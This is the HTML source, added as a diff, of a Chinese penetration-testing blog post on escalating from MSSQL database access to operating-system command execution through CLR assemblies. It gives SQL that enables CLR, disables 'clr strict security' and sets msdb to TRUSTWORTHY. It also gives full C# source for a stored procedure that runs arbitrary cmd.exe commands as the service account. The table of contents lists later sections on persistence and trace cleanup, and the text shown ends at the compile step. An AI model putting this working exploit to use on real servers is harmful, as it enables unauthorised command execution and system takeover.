@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="MSSQL CLR 程序集提权全流程实战。通过 SQL Server CLR 集成功能，编译 .NET DLL 创建自定义存储过程，以 SQL Server 服务账户身份执行系统命令，实现从数据库权限到操作系统命令执行的权限提升。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MSSQL CLR 程序集利用 — 从数据库权限到命令执行">
+<meta property="og:url" content="https://congliang.github.io/MSSQL-CLR-Assembly-Privilege-Escalation/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="MSSQL CLR 程序集提权全流程实战。通过 SQL Server CLR 集成功能，编译 .NET DLL 创建自定义存储过程，以 SQL Server 服务账户身份执行系统命令，实现从数据库权限到操作系统命令执行的权限提升。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-09-15T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-04-20T00:00:00.000Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="数据库安全">
+<meta property="article:tag" content="权限提升">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/MSSQL-CLR-Assembly-Privilege-Escalation/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/MSSQL-CLR-Assembly-Privilege-Escalation/","path":"MSSQL-CLR-Assembly-Privilege-Escalation/","title":"MSSQL CLR 程序集利用 — 从数据库权限到命令执行"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>MSSQL CLR 程序集利用 — 从数据库权限到命令执行 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81CLR-%E6%8F%90%E6%9D%83%E6%A6%82%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">一、CLR 提权概述</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-%E4%BB%80%E4%B9%88%E6%98%AF-CLR-%E7%A8%8B%E5%BA%8F%E9%9B%86"><span class="nav-number">1.1.</span> <span class="nav-text">1.1 什么是 CLR 程序集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="nav-number">1.2.</span> <span class="nav-text">1.2 攻击面</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-%E6%8F%90%E6%9D%83%E6%9D%A1%E4%BB%B6"><span class="nav-number">1.3.</span> <span class="nav-text">1.3 提权条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-%E6%94%BB%E5%87%BB%E9%93%BE%E8%B7%AF%E6%A6%82%E8%BF%B0"><span class="nav-number">1.4.</span> <span class="nav-text">1.4 攻击链路概述</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="nav-number">2.</span> <span class="nav-text">二、环境准备</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-%E6%A3%80%E6%9F%A5-CLR-%E4%B8%8E%E5%8F%AF%E4%BF%A1%E7%8A%B6%E6%80%81"><span class="nav-number">2.1.</span> <span class="nav-text">2.1 检查 CLR 与可信状态</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-%E5%BC%80%E5%90%AF%E5%BF%85%E8%A6%81%E9%85%8D%E7%BD%AE%EF%BC%88%E9%9C%80-sysadmin%EF%BC%89"><span class="nav-number">2.2.</span> <span class="nav-text">2.2 开启必要配置（需 sysadmin）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-%E6%9F%A5%E7%9C%8B%E7%8E%B0%E6%9C%89%E7%A8%8B%E5%BA%8F%E9%9B%86"><span class="nav-number">2.3.</span> <span class="nav-text">2.3 查看现有程序集</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E6%94%BB%E5%87%BB%E5%AE%9E%E7%8E%B0"><span class="nav-number">3.</span> <span class="nav-text">三、攻击实现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-%E7%BC%96%E5%86%99%E6%81%B6%E6%84%8F-C-DLL"><span class="nav-number">3.1.</span> <span class="nav-text">3.1 编写恶意 C# DLL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-%E7%BC%96%E8%AF%91-DLL"><span class="nav-number">3.2.</span> <span class="nav-text">3.2 编译 DLL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-%E6%9C%89%E6%96%87%E4%BB%B6%E5%AF%BC%E5%85%A5-%E2%80%94-%E5%B0%86-DLL-%E5%86%99%E5%85%A5%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%8E%E5%AF%BC%E5%85%A5"><span class="nav-number">3.3.</span> <span class="nav-text">3.3 有文件导入 — 将 DLL 写入服务器后导入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-4-%E6%97%A0%E6%96%87%E4%BB%B6%E5%AF%BC%E5%85%A5-%E2%80%94-%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B4%E6%8E%A5%E5%88%9B%E5%BB%BA"><span class="nav-number">3.4.</span> <span class="nav-text">3.4 无文件导入 — 十六进制字符串直接创建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-5-%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="nav-number">3.5.</span> <span class="nav-text">3.5 执行系统命令</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E5%90%8E%E6%B8%97%E9%80%8F%E4%B8%8E%E6%8C%81%E4%B9%85%E5%8C%96"><span class="nav-number">4.</span> <span class="nav-text">四、后渗透与持久化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-%E5%AF%BC%E5%87%BA%E5%B7%B2%E6%9C%89-CLR-%E7%A8%8B%E5%BA%8F%E9%9B%86-%E2%86%92-%E4%BF%AE%E6%94%B9-%E2%86%92-%E5%9B%9E%E5%86%99"><span class="nav-number">4.1.</span> <span class="nav-text">4.1 导出已有 CLR 程序集 → 修改 → 回写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-%E5%88%9B%E5%BB%BA%E6%8C%81%E4%B9%85%E5%8C%96%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="nav-number">4.2.</span> <span class="nav-text">4.2 创建持久化定时任务</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81%E5%B7%A5%E5%85%B7%E5%8C%96%E5%88%A9%E7%94%A8"><span class="nav-number">5.</span> <span class="nav-text">五、工具化利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-PowerUpSQL"><span class="nav-number">5.1.</span> <span class="nav-text">5.1 PowerUpSQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-Metasploit"><span class="nav-number">5.2.</span> <span class="nav-text">5.2 Metasploit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-3-SQLWinds-%E4%BA%A4%E4%BA%92%E5%BC%8F%E5%B7%A5%E5%85%B7%E5%8C%85"><span class="nav-number">5.3.</span> <span class="nav-text">5.3 SQLWinds 交互式工具包</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81%E6%B8%85%E7%90%86%E7%97%95%E8%BF%B9"><span class="nav-number">6.</span> <span class="nav-text">六、清理痕迹</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E9%93%BE%E8%B7%AF%E6%80%BB%E7%BB%93"><span class="nav-number">7.</span> <span class="nav-text">攻击链路总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%B8%E5%BF%83%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="nav-number">8.</span> <span class="nav-text">核心知识点</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/MSSQL-CLR-Assembly-Privilege-Escalation/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="MSSQL CLR 程序集利用 — 从数据库权限到命令执行 | 渗透测试实战记录">
+      <meta itemprop="description" content="MSSQL CLR 程序集提权全流程实战。通过 SQL Server CLR 集成功能，编译 .NET DLL 创建自定义存储过程，以 SQL Server 服务账户身份执行系统命令，实现从数据库权限到操作系统命令执行的权限提升。">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          MSSQL CLR 程序集利用 — 从数据库权限到命令执行
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-09-15 08:00:00" itemprop="dateCreated datePublished" datetime="2024-09-15T08:00:00+08:00">2024-09-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-04-20 08:00:00" itemprop="dateModified" datetime="2026-04-20T08:00:00+08:00">2026-04-20</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">MSSQL CLR 程序集提权全流程实战。通过 SQL Server CLR 集成功能，编译 .NET DLL 创建自定义存储过程，以 SQL Server 服务账户身份执行系统命令，实现从数据库权限到操作系统命令执行的权限提升。</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><blockquote>
+<p>环境：SQL Server 2016 &#x2F; 2019，Windows。需要有 <code>CREATE ASSEMBLY</code> 或 <code>sysadmin</code> 权限。</p>
+</blockquote>
+<hr>
+<h2 id="一、CLR-提权概述"><a href="#一、CLR-提权概述" class="headerlink" title="一、CLR 提权概述"></a>一、CLR 提权概述</h2><h3 id="1-1-什么是-CLR-程序集"><a href="#1-1-什么是-CLR-程序集" class="headerlink" title="1.1 什么是 CLR 程序集"></a>1.1 什么是 CLR 程序集</h3><p>CLR（Common Language Runtime，公共语言运行时）是 SQL Server 的一项集成功能，允许将 <strong>.NET 编译的 DLL</strong> 导入数据库作为程序集，并将其方法映射为 TSQL 存储过程调用。</p>
+<h3 id="1-2-攻击面"><a href="#1-2-攻击面" class="headerlink" title="1.2 攻击面"></a>1.2 攻击面</h3><table>
+<thead>
+<tr>
+<th>组件</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>程序集 (Assembly)</strong></td>
+<td>.NET DLL，可包含任意 C# 代码</td>
+</tr>
+<tr>
+<td><strong>存储过程 (Procedure)</strong></td>
+<td>映射 DLL 方法，可通过 TSQL 调用</td>
+</tr>
+<tr>
+<td><strong>执行上下文</strong></td>
+<td>以 <strong>SQL Server 服务账户</strong> 身份运行</td>
+</tr>
+<tr>
+<td><strong>权限要求</strong></td>
+<td><code>CREATE ASSEMBLY</code> 或 <code>ALTER ASSEMBLY</code> 权限（<code>db_ddladmin</code> 角色即可）</td>
+</tr>
+</tbody></table>
+<h3 id="1-3-提权条件"><a href="#1-3-提权条件" class="headerlink" title="1.3 提权条件"></a>1.3 提权条件</h3><table>
+<thead>
+<tr>
+<th>前置条件</th>
+<th>默认值</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>clr enabled</code> &#x3D; 1</td>
+<td><strong>OFF</strong></td>
+<td>必须由 sysadmin 开启</td>
+</tr>
+<tr>
+<td><code>is_trustworthy</code> &#x3D; ON</td>
+<td>仅 <strong>msdb</strong> 默认为 ON</td>
+<td>目标数据库需可信</td>
+</tr>
+<tr>
+<td><code>CREATE/ALTER ASSEMBLY</code> 权限</td>
+<td>sysadmin 持有</td>
+<td>db_ddladmin 角色有 ALTER 权限</td>
+</tr>
+<tr>
+<td><code>clr strict security</code> &#x3D; 0</td>
+<td>SQL 2017+ 默认为 ON</td>
+<td>需额外禁用或提供证书签名</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>**** CLR 程序集在 <code>PERMISSION_SET = UNSAFE</code> 模式下可直接调用 <code>System.Diagnostics.Process</code> 执行任意系统命令，以 SQL Server 服务账户身份运行。</p>
+</blockquote>
+<h3 id="1-4-攻击链路概述"><a href="#1-4-攻击链路概述" class="headerlink" title="1.4 攻击链路概述"></a>1.4 攻击链路概述</h3><pre class="mermaid">flowchart LR
+    A[获取 SQL Server 登录凭据] --> B{具备 CREATE ASSEMBLY?}
+    B -->|YES| C[编译恶意的 .NET DLL]
+    C --> D[CREATE ASSEMBLY 导入]
+    D --> E[CREATE PROCEDURE 映射]
+    E --> F[EXEC 执行系统命令]
+    F --> G[以服务账户身份获得 OS 执行能力]
+    G --> H{服务账户权限?}
+    H -->|NT AUTHORITY\SYSTEM| I[完全控制系统]
+    H -->|Local Admin| J[创建管理员账户 / 提权]</pre>
+
+<hr>
+<h2 id="二、环境准备"><a href="#二、环境准备" class="headerlink" title="二、环境准备"></a>二、环境准备</h2><h3 id="2-1-检查-CLR-与可信状态"><a href="#2-1-检查-CLR-与可信状态" class="headerlink" title="2.1 检查 CLR 与可信状态"></a>2.1 检查 CLR 与可信状态</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 检查 CLR 是否启用（0=关闭, 1=开启）</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;clr enabled&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 检查所有数据库的 trustworthy 状态</span></span><br><span class="line"><span class="keyword">SELECT</span> name, is_trustworthy_on <span class="keyword">FROM</span> sys.databases;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查看 CLR strict security 状态（SQL 2017+）</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;clr strict security&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-开启必要配置（需-sysadmin）"><a href="#2-2-开启必要配置（需-sysadmin）" class="headerlink" title="2.2 开启必要配置（需 sysadmin）"></a>2.2 开启必要配置（需 sysadmin）</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 显示高级选项</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 启用 CLR</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;clr enabled&#x27;</span>, <span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line"><span class="comment">-- SQL 2017+ 需额外禁用 strict security</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;clr strict security&#x27;</span>, <span class="number">0</span>;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 确保 msdb 数据库可信</span></span><br><span class="line"><span class="keyword">ALTER</span> DATABASE msdb <span class="keyword">SET</span> TRUSTWORTHY <span class="keyword">ON</span>;</span><br><span class="line">GO</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-3-查看现有程序集"><a href="#2-3-查看现有程序集" class="headerlink" title="2.3 查看现有程序集"></a>2.3 查看现有程序集</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 枚举已有的 CLR 程序集和对应存储过程</span></span><br><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">    af.name <span class="keyword">AS</span> dll_name,</span><br><span class="line">    asmbly.name <span class="keyword">AS</span> assembly_name,</span><br><span class="line">    am.assembly_class,</span><br><span class="line">    am.assembly_method,</span><br><span class="line">    so.name <span class="keyword">AS</span> procedure_name,</span><br><span class="line">    asmbly.permission_set_desc,</span><br><span class="line">    asmbly.create_date</span><br><span class="line"><span class="keyword">FROM</span> sys.assembly_modules am</span><br><span class="line"><span class="keyword">INNER</span> <span class="keyword">JOIN</span> sys.assemblies asmbly <span class="keyword">ON</span> asmbly.assembly_id <span class="operator">=</span> am.assembly_id</span><br><span class="line"><span class="keyword">INNER</span> <span class="keyword">JOIN</span> sys.assembly_files af <span class="keyword">ON</span> asmbly.assembly_id <span class="operator">=</span> af.assembly_id</span><br><span class="line"><span class="keyword">INNER</span> <span class="keyword">JOIN</span> sys.objects so <span class="keyword">ON</span> so.[object_id] <span class="operator">=</span> am.[object_id];</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="三、攻击实现"><a href="#三、攻击实现" class="headerlink" title="三、攻击实现"></a>三、攻击实现</h2><h3 id="3-1-编写恶意-C-DLL"><a href="#3-1-编写恶意-C-DLL" class="headerlink" title="3.1 编写恶意 C# DLL"></a>3.1 编写恶意 C# DLL</h3><p>以下代码实现了通过 <code>System.Diagnostics.Process</code> 执行任意系统命令并将输出返回 SQL 客户端：</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 文件名: cmd_exec.cs</span></span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Data;</span><br><span class="line"><span class="keyword">using</span> System.Data.SqlTypes;</span><br><span class="line"><span class="keyword">using</span> System.Data.SqlClient;</span><br><span class="line"><span class="keyword">using</span> Microsoft.SqlServer.Server;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">partial</span> <span class="keyword">class</span> <span class="title">StoredProcedures</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">Microsoft.SqlServer.Server.SqlProcedure</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">cmd_exec</span>(<span class="params">SqlString execCommand</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        Process proc = <span class="keyword">new</span> Process();</span><br><span class="line">        proc.StartInfo.FileName = <span class="string">@&quot;C:\Windows\System32\cmd.exe&quot;</span>;</span><br><span class="line">        proc.StartInfo.Arguments = <span class="built_in">string</span>.Format(<span class="string">@&quot; /C &#123;0&#125;&quot;</span>, execCommand.Value);</span><br><span class="line">        proc.StartInfo.UseShellExecute = <span class="literal">false</span>;</span><br><span class="line">        proc.StartInfo.RedirectStandardOutput = <span class="literal">true</span>;</span><br><span class="line">        proc.Start();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将命令输出逐行返回 SQL 客户端</span></span><br><span class="line">        SqlDataRecord <span class="keyword">record</span> = <span class="keyword">new</span> SqlDataRecord(</span><br><span class="line">            <span class="keyword">new</span> SqlMetaData(<span class="string">&quot;output&quot;</span>, SqlDbType.NVarChar, <span class="number">4000</span>));</span><br><span class="line">        SqlContext.Pipe.SendResultsStart(<span class="keyword">record</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> (!proc.StandardOutput.EndOfStream)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">record</span>.SetString(<span class="number">0</span>, proc.StandardOutput.ReadLine());</span><br><span class="line">            SqlContext.Pipe.SendResultsRow(<span class="keyword">record</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        SqlContext.Pipe.SendResultsEnd();</span><br><span class="line">        proc.WaitForExit();</span><br><span class="line">        proc.Close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-2-编译-DLL"><a href="#3-2-编译-DLL" class="headerlink" title="3.2 编译 DLL"></a>3.2 编译 DLL</h3><p>使用系统自带的 <code>csc.exe</code>（C# 编译器，随 .NET Framework 安装），无需 Visual Studio：</p>
